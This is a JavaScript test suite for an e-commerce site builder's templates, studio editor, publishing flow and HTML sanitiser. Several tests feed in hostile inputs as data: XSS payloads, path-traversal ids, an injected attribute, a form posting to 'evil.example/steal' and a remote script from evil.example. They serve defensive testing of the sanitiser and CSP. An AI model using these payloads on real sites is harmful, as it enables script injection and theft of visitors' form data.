/* Templates « site complet » (site1…site16) : catalogue, assets, choix par le marchand,
   brouillon puis publication, rendu de la vitrine, inscription depuis la galerie. */
const { test, before, after } = require("node:test")
const assert = require("node:assert")
const fs = require("node:fs")
const os = require("node:os")
const path = require("node:path")
const { startServer } = require("./boot")

const DB = path.join(os.tmpdir(), `novadz-sites-${Date.now()}.db`)
let BASE = "", server
const jar = new Map()
const cookieHeader = () => [...jar.entries()].map(([k, v]) => `${k}=${v}`).join("; ")
async function req(p, opts = {}) {
  const res = await fetch(BASE + p, { ...opts, headers: { ...(opts.headers || {}), cookie: cookieHeader() }, redirect: "manual" })
  for (const c of (res.headers.getSetCookie ? res.headers.getSetCookie() : [])) {
    const [pair] = c.split(";"); const i = pair.indexOf("=")
    jar.set(pair.slice(0, i), pair.slice(i + 1))
  }
  return { status: res.status, text: await res.text(), location: res.headers.get("location") || "" }
}
const form = (obj) => ({ method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: new URLSearchParams(obj).toString() })
const json = (obj) => ({ method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(obj) })

before(async () => {
  try { fs.unlinkSync(DB) } catch (_) {}
  const s = await startServer({ db: DB }); server = s.child; BASE = s.base
})
after(() => { if (server) server.kill(); try { fs.unlinkSync(DB) } catch (_) {} })

test("catalogue : 16 templates, chacun a son HTML, sa capture et des assets présents", () => {
  const S = require("../src/site-templates")
  const base = S.LIST.filter((t) => /^site([1-9]|1[0-6])$/.test(t.id))
  assert.equal(base.length, 16)
  for (const t of base) {
    const html = path.join(__dirname, "..", "public", "templates", t.id + ".html")
    assert.ok(fs.existsSync(html), "html manquant " + t.id)
    assert.ok(fs.existsSync(path.join(__dirname, "..", "public", "shots", t.id + ".jpg")), "capture manquante " + t.id)
    const src = fs.readFileSync(html, "utf8")
    assert.ok(src.length < 2_000_000, t.id + " trop lourd : les images doivent être des fichiers")
    for (const m of src.matchAll(/\/templates\/(site\d+)\/a\/([\w.-]+)/g)) {
      assert.ok(fs.existsSync(path.join(__dirname, "..", "public", "templates", m[1], "a", m[2])), "asset manquant " + m[0])
    }
  }
  assert.ok(!S.isSite("../etc/passwd") && !S.isSite("site17") && S.isSite("site9"))
})

test("rendu : nom et produits échappés, panier présent, un seul bloc boutique", () => {
  const S = require("../src/site-templates")
  for (const t of S.LIST) {
    const h = S.render({ slug: "x", name: "A<script>1</script>" }, [{ id: 7, title: "T\"><img src=x>", price_cents: 1000, image: "" }], t.id, { cartCount: 3 })
    assert.ok(h.includes("A&lt;script&gt;1&lt;/script&gt;"), t.id)
    assert.ok(!h.includes("<img src=x>"), t.id)
    assert.equal((h.match(/id="ndz-boutique"/g) || []).length, 1, t.id)
    assert.ok(h.includes("/x/cart") && h.includes("Panier (3)"), t.id)
  }
})

test("marchand : choisir un template = brouillon, puis Publier = vitrine", async () => {
  await req("/login", form({ email: "demo@novadz.dz", password: "demo1234" }))
  const themes = await req("/dashboard/design/themes")
  assert.match(themes.text, /Templates sites complets/)
  assert.match(themes.text, /\/shots\/site16\.jpg/)

  const bad = await req("/dashboard/design/site-template", form({ id: "../../x" }))
  assert.match(bad.location, /design\/themes/)

  const pick = await req("/dashboard/design/site-template", form({ id: "site11" }))
  assert.equal(pick.status, 302)

  let shop = await req("/amina-mode")
  assert.ok(!shop.text.includes("ndz-boutique"), "pas visible avant Publier")
  const prev = await req("/amina-mode?preview=1")
  assert.ok(prev.text.includes("ndz-boutique"), "l'aperçu du brouillon montre le template")

  const pub = await req("/dashboard/design/publish", { method: "POST" })
  assert.equal(pub.status, 200)
  shop = await req("/amina-mode")
  assert.ok(shop.text.includes("ndz-boutique") && shop.text.includes("/amina-mode/checkout"))

  /* l'enregistrement de l'éditeur ne doit pas effacer le choix */
  await req("/dashboard/design/save", json({ design: { showNovadz: true } }))
  await req("/dashboard/design/publish", { method: "POST" })
  shop = await req("/amina-mode")
  assert.ok(shop.text.includes("ndz-boutique"), "template conservé après sauvegarde éditeur")

  /* la recherche et le reste de la boutique gardent le thème Nova */
  const search = await req("/amina-mode?q=a")
  assert.ok(!search.text.includes("ndz-boutique"))
  assert.equal((await req("/amina-mode/cart")).status, 200)

  /* retour à un thème classique */
  await req("/dashboard/design/site-template", form({ id: "" }))
  await req("/dashboard/design/publish", { method: "POST" })
  assert.ok(!(await req("/amina-mode")).text.includes("ndz-boutique"))
})

test("galerie : 16 cartes avec « Utiliser » ; l'inscription garde le template", async () => {
  jar.clear()
  const home = await req("/")
  assert.equal((home.text.match(/\/signup\?site=site\d+/g) || []).length >= 16, true)
  const su = await req("/signup?site=site5")
  assert.match(su.text, /name="site" value="site5"/)
  const out = await req("/signup", form({ kind: "commerce", theme: "", site: "site5", store: "Ma Boutique Test", name: "Test", email: "t@t.dz", password: "secret1", password2: "secret1" }))
  assert.equal(out.status, 302)
  assert.match(out.location, /\/dashboard\/studio/)
  const prev = await req("/ma-boutique-test?preview=1")
  assert.ok(prev.text.includes("ndz-boutique"))
})

test("studio : brouillon, publication, assainissement, CSP, isolation", async () => {
  await req("/login", form({ email: "demo@novadz.dz", password: "demo1234" }))
  await req("/dashboard/design/site-template", form({ id: "site11" }))
  const studio = await req("/dashboard/studio")
  assert.equal(studio.status, 200)
  assert.match(studio.text, /_studio\/studio\.js/)

  const frame = await req("/dashboard/studio/frame")
  assert.match(frame.text, /_studio\/frame\.js/)
  assert.match(frame.text, /data-ndz="produits"/)

  const evil = '<!doctype html><html><head><title>t</title><script>alert(1)</script></head><body><h1 onclick="x()">STUDIO-MARK</h1><a href="javascript:alert(1)">l</a><iframe src="//e"></iframe><div data-ndz="produits"></div></body></html>'
  const save = await req("/dashboard/studio/save", json({ html: evil }))
  assert.equal(JSON.parse(save.text).ok, true)
  assert.equal(JSON.parse((await req("/dashboard/studio/save", json({ html: "pas du html" }))).text).ok, false)

  await req("/dashboard/studio/publish", { method: "POST" }).then((r) => assert.equal(JSON.parse(r.text).ok, true))
  const live = await fetch(BASE + "/amina-mode")
  const html = await live.text()
  const csp = live.headers.get("content-security-policy")
  assert.match(csp, /script-src 'self'(;|$)/)
  assert.ok(!/script-src[^;]*unsafe-inline/.test(csp), "aucun script inline autorisé")
  assert.ok(html.includes("STUDIO-MARK") && html.includes("ndz-boutique"))
  assert.ok(!/alert\(1\)|onclick|<iframe|javascript:/i.test(html), "code actif retiré")

  /* brouillon plus récent : invisible au public, visible en aperçu propriétaire */
  await req("/dashboard/studio/save", json({ html: evil.replace("STUDIO-MARK", "BROUILLON-X") }))
  assert.ok(!(await (await fetch(BASE + "/amina-mode")).text()).includes("BROUILLON-X"))
  assert.ok((await req("/amina-mode?preview=1")).text.includes("BROUILLON-X"))

  /* anonyme : pas d'accès au studio */
  const anon = await fetch(BASE + "/dashboard/studio/save", { method: "POST", headers: { "Content-Type": "application/json" }, body: "{}", redirect: "manual" })
  assert.notEqual(anon.status, 200)

  await req("/dashboard/studio/reset", { method: "POST" })
  assert.ok(!(await (await fetch(BASE + "/amina-mode")).text()).includes("STUDIO-MARK"), "retour au modèle")
})

test("studio : pages multiples, formulaire, vidéo, boutons d'achat, animations", async () => {
  jar.clear()
  await req("/login", form({ email: "demo@novadz.dz", password: "demo1234" }))
  await req("/dashboard/design/site-template", form({ id: "site12" }))
  const meta = JSON.parse((await req("/dashboard/studio/meta")).text)
  assert.ok(meta.ok && meta.pages[0].key === "home" && Array.isArray(meta.products))
  const pid = meta.products[0] && meta.products[0].id
  assert.ok(pid, "le magasin de démo a des produits")

  const html = `<!doctype html><html><head><title>t</title></head><body>
    <h1 data-fx="up" data-fx-hover="lift">ACCUEIL-X</h1>
    <a href="#" data-ndz-buy="direct" data-ndz-pid="${pid}">Acheter</a>
    <div data-ndz-video="dQw4w9WgXcQ" style="position:relative"></div>
    <div data-ndz-video="x\" onload=\"1" style="position:relative"></div>
    <form data-ndz-form action="//evil.example/steal" method="get"><input name="name"><input name="message"><input name="phone"></form>
    <div data-ndz="produits"></div></body></html>`
  assert.equal(JSON.parse((await req("/dashboard/studio/save", json({ html }))).text).ok, true)

  /* nouvelle page = copie, avec son propre contenu */
  const np = JSON.parse((await req("/dashboard/studio/page", json({ name: "À propos", from: "home" }))).text)
  assert.ok(np.ok && np.key === "a-propos", JSON.stringify(np))
  await req("/dashboard/studio/save", json({ html: html.replace("ACCUEIL-X", "APROPOS-X"), page: "a-propos" }))
  assert.equal(JSON.parse((await req("/dashboard/studio/page", json({ name: "", from: "home" }))).text).ok, false)
  await req("/dashboard/studio/publish", { method: "POST" })

  const home = await fetch(BASE + "/amina-mode"), h = await home.text()
  assert.ok(h.includes("ACCUEIL-X") && !h.includes("APROPOS-X"))
  assert.match(home.headers.get("content-security-policy"), /script-src 'self'/)
  assert.ok(h.includes('src="/_studio/fx.js"') && h.includes("/_studio/fx.css"))
  assert.ok(h.includes(`href="/amina-mode/p/${pid}"`), "bouton d'achat : repli vers la fiche produit")
  assert.ok(h.includes("youtube-nocookie.com/embed/dQw4w9WgXcQ"), "vidéo valide")
  assert.equal((h.match(/<iframe/g) || []).length, 1, "une seule iframe : l'identifiant piégé est ignoré")
  assert.ok(h.includes('action="/amina-mode/s-form"') && !h.includes("evil.example"), "formulaire : adresse d'envoi imposée")

  const sub = await fetch(BASE + "/amina-mode/s/a-propos")
  assert.equal(sub.status, 200)
  const sh = await sub.text()
  assert.ok(sh.includes("APROPOS-X") && !sh.includes("ACCUEIL-X"))
  assert.ok(sh.includes('name="back" value="a-propos"'))
  assert.equal((await fetch(BASE + "/amina-mode/s/inconnue")).status, 404)

  /* formulaire : message dans la boîte de réception, anti-spam (pot de miel) */
  const post = (b) => fetch(BASE + "/amina-mode/s-form", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: new URLSearchParams(b).toString(), redirect: "manual" })
  const ok = await post({ name: "Karim", phone: "0555123456", message: "Bonjour test", back: "a-propos" })
  assert.equal(ok.headers.get("location"), "/amina-mode/s/a-propos?sent=1")
  const bot = await post({ name: "Bot", phone: "0555", message: "spam", website: "x" })
  assert.equal(bot.headers.get("location"), "/amina-mode")
  const bad = await post({ name: "K", message: "x" })
  assert.match(bad.headers.get("location"), /sent=0/)

  /* suppression : la page disparaît, l'accueil reste */
  assert.equal(JSON.parse((await req("/dashboard/studio/page/delete", json({ key: "a-propos" }))).text).ok, true)
  assert.equal((await fetch(BASE + "/amina-mode/s/a-propos")).status, 404)
  assert.equal(JSON.parse((await req("/dashboard/studio/page/delete", json({ key: "home" }))).text).ok, false)
})

/* ---- templates importés : scripts du template, pages du template, taille ---- */
const TPL = path.join(__dirname, "..", "public", "templates")
const FIX = "zz-fixture"
let catBackup = null
function fixtureUp() {
  const cat = path.join(TPL, "catalog.json")
  catBackup = fs.existsSync(cat) ? fs.readFileSync(cat, "utf8") : null
  const list = catBackup ? JSON.parse(catBackup) : []
  fs.writeFileSync(cat, JSON.stringify(list.concat([{ id: FIX, name: "Fixture", niche: "t", line: "t", kind: "vitrine" }])))
  fs.mkdirSync(path.join(TPL, FIX, "js"), { recursive: true }); fs.mkdirSync(path.join(TPL, FIX, "pages"), { recursive: true })
  fs.writeFileSync(path.join(TPL, FIX, "js", "a.js"), "window.__fix=1")
  fs.writeFileSync(path.join(TPL, FIX, "manifest.json"), JSON.stringify({ pages: [{ key: "about", name: "A propos" }] }))
  fs.writeFileSync(path.join(TPL, FIX, "pages", "about.html"), '<!doctype html><html><head><title>x</title></head><body><h1>ABOUT-TPL</h1><a href="/__ndz__">retour</a></body></html>')
  fs.writeFileSync(path.join(TPL, FIX + ".html"), `<!doctype html><html><head><title>x</title><script defer src="/templates/${FIX}/js/a.js"></script></head><body><h1>HOME-TPL</h1><a href="/__ndz__/s/about">a</a></body></html>`)
}
function fixtureDown() {
  fs.rmSync(path.join(TPL, FIX), { recursive: true, force: true }); fs.rmSync(path.join(TPL, FIX + ".html"), { force: true })
  const cat = path.join(TPL, "catalog.json")
  catBackup === null ? fs.rmSync(cat, { force: true }) : fs.writeFileSync(cat, catBackup)
}
after(fixtureDown)

test("template importé : scripts du template seulement, pages du template, liens reliés, limite 6 Mo", async () => {
  fixtureUp()
  jar.clear()
  await req("/login", form({ email: "demo@novadz.dz", password: "demo1234" }))
  assert.equal((await req("/dashboard/design/site-template", form({ id: FIX }))).status, 302)

  const meta = JSON.parse((await req("/dashboard/studio/meta")).text)
  assert.deepEqual(meta.pages.map((p) => p.key), ["home", "about"], "les pages du template apparaissent")

  /* éditeur : scripts en pause (sinon ils casseraient la sélection) */
  const frame = (await req("/dashboard/studio/frame")).text
  assert.ok(frame.includes('type="text/ndz-off"') && !frame.includes(`<script defer src="/templates/${FIX}`))
  const frame2 = (await req("/dashboard/studio/frame?page=about")).text
  assert.ok(frame2.includes("ABOUT-TPL"))

  /* l'enregistrement remet le script du template, mais refuse tout autre script */
  const doc = (inner) => `<!doctype html><html><head><title>t</title>${inner}</head><body><h1>MARK-1</h1></body></html>`
  const good = `<script type="text/ndz-off" data-ndz-src="/templates/${FIX}/js/a.js"></script>`
  const attacks = [
    `<script type="text/ndz-off" data-ndz-src="/templates/${FIX}/js/absent.js"></script>`,
    `<script type="text/ndz-off" data-ndz-src="/templates/${FIX}/js/../../../server.js"></script>`,
    `<script type="text/ndz-off" data-ndz-src="https://evil.example/x.js"></script>`,
    `<script src="/templates/${FIX}/js/a.js"></script>`,
    `<script>alert(1)</script>`,
  ]
  await req("/dashboard/studio/save", json({ html: doc(good + attacks.join("")) }))
  await req("/dashboard/studio/publish", { method: "POST" })
  const home = (await (await fetch(BASE + "/amina-mode")).text())
  assert.equal((home.match(/<script[^>]*templates\/zz-fixture\/js\/a\.js/g) || []).length, 1, "script du template conservé une seule fois")
  assert.ok(!/absent\.js|evil\.example|server\.js|alert\(1\)|ndz-off/.test(home), "scripts non autorisés retirés")

  /* page du template servie telle quelle, liens reliés à la boutique */
  const about = await (await fetch(BASE + "/amina-mode/s/about")).text()
  assert.ok(about.includes("ABOUT-TPL") && about.includes('href="/amina-mode"'))

  /* taille : 5 Mo passent, 7 Mo non */
  const big = (n) => doc("") .replace("</body>", "<p>" + "x".repeat(n) + "</p></body>")
  assert.equal(JSON.parse((await req("/dashboard/studio/save", json({ html: big(5 * 1024 * 1024) }))).text).ok, true)
  const tooBig = await req("/dashboard/studio/save", json({ html: big(7 * 1024 * 1024) }))
  assert.equal(JSON.parse(tooBig.text).ok, false)

  await req("/dashboard/studio/reset", { method: "POST" })
  await req("/dashboard/design/site-template", form({ id: "" }))
})
